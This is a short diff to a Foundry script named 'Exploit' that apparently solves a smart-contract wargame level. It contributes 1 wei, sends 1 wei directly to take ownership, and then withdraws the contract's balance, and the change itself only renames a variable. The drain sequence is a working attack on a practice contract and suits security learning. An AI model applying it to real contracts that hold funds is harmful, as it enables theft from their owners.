@@ -16,8 +16,8 @@ contract Exploit is Script {
         vm.startBroadcast(hacker);
         
         level.contribute{value: 1 wei}();
-        (bool sent, ) = address(level).call{value: 1 wei}("");
-        require(sent, "Failed to call send()");
+        (bool success, ) = address(level).call{value: 1 wei}("");
+        require(success, "failed to call send()");
         level.withdraw();
 
         vm.stopBroadcast();
